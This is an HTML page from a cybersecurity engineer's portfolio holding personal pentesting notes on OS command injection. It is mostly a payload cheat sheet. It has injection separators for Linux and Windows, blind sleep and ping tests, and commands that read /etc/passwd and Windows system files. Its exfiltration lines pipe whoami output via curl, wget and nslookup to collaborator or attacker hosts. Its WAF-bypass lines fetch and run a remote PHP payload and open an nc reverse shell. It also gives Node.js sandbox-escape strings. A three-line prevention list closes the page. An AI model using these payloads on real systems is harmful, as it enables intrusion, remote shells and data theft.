@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="7fcb8bba-ff66-41fe-a477-c37f4edbaefd" class="page sans"><header><h1 class="page-title">Command Injection</h1><p class="page-description"></p></header><div class="page-body"><ul id="885ff212-5916-4cd3-9a7b-5b2512cbb241" class="bulleted-list"><li style="list-style-type:disc">Search for cmd= in URLS</li></ul><ul id="a2729614-b2c9-47a1-a5a3-9b8dbe18c208" class="bulleted-list"><li style="list-style-type:disc">search for inputs that allow for system level commands to be executed…</li></ul><ul id="5734953b-c3dc-4b9b-bdce-5c38eb424791" class="bulleted-list"><li style="list-style-type:disc">Follow this guide for checks: <a href="https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection">https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection</a></li></ul><p id="19269227-16d2-4e10-93eb-737a08203951" class="">
+</p><p id="1071b24a-9cb3-4fc9-955d-3714e91c017f" class=""><strong>Payloads:</strong></p><p id="310bd382-674f-4432-a482-2819a83bfac8" class=""><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="93605604-da82-41b4-9287-e8e74ac6b700" class="code"><code class="language-Python">Examples (Also URL encoding these payloads)
+#Regular
+productid=1 &amp; whoami #
+#Blind
+&amp; sleep 10 #
+|| ping -c 10 127.0.0.1 ||
+#Output redirection
+&amp; whoami &gt; /valid/accessible/path.txt#
+#Blind, Out-of-band
+&amp; nslookup &lt;website&gt; #
+#Blind, Out-of-band Data Exfiltration
+&amp; nslookup `whoami`.&lt;website&gt; #
+&amp; nslookup $(whoami).&lt;website&gt; #
+&#x27; whoami
+&quot; whoami
+` whoami
+; whoami
+test1&#x27; &amp;&amp; whoami &amp;&amp; &#x27;test2
+&lt; whoami
+#Dont forget to try comments!!! -&gt; #
+--------------------------------------------------------------------
+Special Characters
+Newline (0x0a or \n)
+&amp;
+&amp;&amp;
+|
+||
+`command `
+$(command )
+--------------------------------------------------------------------
+Useful Commands: Linux
+whoami
+ifconfig
+ls
+uname -a
+cat /etc/passwd
+ping -c 2 &lt;host&gt;
+--------------------------------------------------------------------
+Useful Commands: Windows
+whoami
+ipconfig
+dir
+ver
+type C:\Windows\win.ini
+type C:\Windows\System32\Drivers\etc\hosts
+ping -n 2 &lt;host&gt;
+nslookup &lt;host&gt;
+--------------------------------------------------------------------
+Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id 
+ls|id; ls |id; ls| id; ls | id 
+ls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id 
+ls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id 
+ls %0A id
+--------------------------------------------------------------------
+Redirecting output
+&amp; whoami &gt; /var/www/images/output.txt &amp;
+-------------------------------------------------------------------
+WAF bypasses
+vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
+/tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
+vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
+-------------------------------------------------------------------
+#Language specific commands
+#nodeJS
+process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)
+#nodeJS with sandbox bypass
+this.constructor.constructor(&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;)()
+({}).constructor.constructor(&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;)()</code></pre><p id="2bb56507-c2a6-49a3-b8c1-57d1e2c890aa" class="">
+</p><p id="b91529b7-b7db-486d-8c3d-f9a861400b30" class="">
+</p><p id="215e4d59-f905-41da-affa-ef2f53ebf412" class="">Linux:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="92d24ac2-d7a5-44ef-90a4-b3227ec85e71" class="code"><code class="language-XML">text ; &lt;command&gt;
+text ; &lt;command&gt; ;
+text ; &lt;command&gt; ||
+text ; &lt;command&gt; #
+text &amp;&amp; &lt;command&gt;
+text &amp;&amp; &lt;command&gt; ;
+text &amp;&amp; &lt;command&gt; ||
+text &amp;&amp; &lt;command&gt; #
+text || &lt;command&gt;
+text || &lt;command&gt; ;
+text || &lt;command&gt; ||
+text || &lt;command&gt; #
+text | &lt;command&gt;
+text | &lt;command&gt; ;
+text | &lt;command&gt; ||
+text | &lt;command&gt; #
+`&lt;command&gt;`
+$(&lt;command&gt;)
+
+#Also test with &quot;
+text&#x27; ; &lt;command&gt; ; echo &#x27;text
+text&#x27; &amp;&amp; &lt;command&gt; ; echo &#x27;text
+text&#x27; || &lt;command&gt; ; echo &#x27;text
+text&#x27; | &lt;command&gt; ; echo &#x27;text
+text&#x27; ; &lt;command&gt; #
+text&#x27; &amp;&amp; &lt;command&gt; #
+text&#x27; || &lt;command&gt; #
+text&#x27; | &lt;command&gt; #
+`&lt;command&gt;`
+$(&lt;command&gt;)</code></pre><p id="012b0640-f696-4582-89ae-a59938f54623" class="">
+</p><p id="3c9fe77c-e6c3-48dd-84aa-339a09eb54f5" class="">Windows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8cb25aec-735e-4b11-a8e5-f8b3981655ae" class="code"><code class="language-XML">text &amp; &lt;command&gt;
+text &amp; &lt;command&gt; &amp;
+text &amp; &lt;command&gt; &amp;&amp;
+text &amp; &lt;command&gt; ||
+text &amp;&amp; &lt;command&gt;
+text &amp;&amp; &lt;command&gt; &amp;
+text &amp;&amp; &lt;command&gt; &amp;&amp;
+text &amp;&amp; &lt;command&gt; ||
+text || &lt;command&gt;
+text || &lt;command&gt; &amp;
+text || &lt;command&gt; &amp;&amp;
+text || &lt;command&gt; ||
+text | &lt;command&gt;
+text | &lt;command&gt; &amp;
+text | &lt;command&gt; &amp;&amp;
+text | &lt;command&gt; ||
+
+#Also test with &quot;
+text&#x27; &amp; &lt;command&gt; &amp; &#x27;text
+text&#x27; &amp; &lt;command&gt; || &#x27;text
+text&#x27; &amp; &lt;command&gt; &amp;&amp; &#x27;text
+text&#x27; &amp;&amp; &lt;command&gt; &amp; &#x27;text
+text&#x27; &amp;&amp; &lt;command&gt; || &#x27;text
+text&#x27; &amp;&amp; &lt;command&gt; &amp;&amp; &#x27;text
+text&#x27; || &lt;command&gt; &amp; &#x27;text
+text&#x27; || &lt;command&gt; || &#x27;text
+text&#x27; || &lt;command&gt; &amp;&amp; &#x27;text
+text&#x27; | &lt;command&gt; &amp; &#x27;text
+text&#x27; | &lt;command&gt; || &#x27;text
+text&#x27; | &lt;command&gt; &amp;&amp; &#x27;text</code></pre><p id="bd52e265-5600-4f72-bb0a-b05d7323250f" class=""><strong>OS Command Injections:</strong></p><p id="22022ace-b913-4652-92be-7144c490d943" class=""><strong>Blind:</strong></p><p id="a737f6cf-07b5-453a-874e-cddafff5d45b" class="">Send sleep commands to test</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7763900a-afc4-4c90-9e41-3e03ce558639" class="code"><code class="language-PHP">sleep 5
+
+
+#blind checks
+sleep 5
+ping -c 3 127.0.0.1
+test1 ; nslookup &lt;COLLAB-HOST&gt;
+test1 ; dig &lt;COLLAB-HOST&gt;
+test1 ; host &lt;COLLAB-HOST&gt;
+test1 ; ping -c 2 &lt;COLLAB-HOST&gt;
+
+#Windows:
+
+timeout /T 5
+
+--------------------------------------------------------------------
+#OOB (Out Of Band) Exploitation
+test ; whoami | curl -X POST --data-binary @- https://&lt;COLLAB-HOST&gt;/
+test ; OUTPUT=$(whoami); wget --post-data=&quot;$OUTPUT&quot; -q0- https://&lt;COLLAB-HOST&gt;/
+curl -d &quot;param1=$(cat whoami|base64 -w 0)&quot; -X POST &lt;CollaboratorPayload&gt;
+&amp; nslookup attacker-server.com &amp;
+&amp; nslookup `whoami`.attacker-server.com &amp;
+
+
+|| ping 0.0.0.0 ; x || ping 0.0.0.0 &amp;
+| ping -i 30 0.0.0.0 |
+| ping -n 30 0.0.0.0 |
+&amp; ping 0.0.0.0 &amp;
+; ping 0.0.0.0 ;
+` ping 0.0.0.0 `
+%0a ping 0.0.0.0 %0a
+&amp; ping -c 10 127.0.0.1 &amp;</code></pre><p id="1b03022a-af39-4f40-9438-74f281f16204" class=""><strong>We can test for cmd injection using web server root directories:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18308b41-3c4f-45b8-8a58-13e3b86364e4" class="code"><code class="language-Python">touch test.txt &lt;location&gt;
+
+/var/www/
+/var/www/html/
+/var/www/public/
+/var/www/static/
+/images/</code></pre><p id="1604092a-6529-45ae-8939-24a3311a3dbc" class="">
+</p><p id="a2faabe7-db23-4864-b2eb-00321c41643a" class="">
+</p><p id="4143b5fb-6e80-4b99-802a-bc439cdd37ff" class=""><strong>Dynamic Execution:</strong></p><p id="9a36617c-e093-43c6-8c3a-59fc20ce0fc2" class="">PHP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="71b0e6f8-52b5-4b3f-8dd0-596a4605593d" class="code"><code class="language-Python">file_get_contents()
+system()
+perl:
+eval()
+ASP:
+Execute()</code></pre><p id="7d9bd297-c6d5-4065-9f88-6366d6d7e6f3" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f783cc19-8223-46a1-bcda-5f5d2f07c8e6" class="code"><code class="language-Python">;echo%20111111
+echo%20111111
+response.write%20111111
+:response.write%20111111</code></pre><p id="2c71d6f2-f178-4150-9e20-cf37c56d10a9" class="">
+</p><p id="15f3581c-5ad6-4266-bffe-a42a033be60c" class="">Prevention</p><ul id="44db11d6-baa5-42c8-9771-08f06f822429" class="bulleted-list"><li style="list-style-type:disc">Whitelist of commands</li></ul><ul id="5ac77b71-fd40-487c-99b4-516579144805" class="bulleted-list"><li style="list-style-type:disc">Limiting to alphanumeric chars</li></ul><ul id="230d0ef7-0d58-4d3e-adc9-6f0c613827b3" class="bulleted-list"><li style="list-style-type:disc">Command APIs instead of command strings</li></ul><p id="7b5817c6-a911-459b-9eae-54122abdc89a" class="">
+</p></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
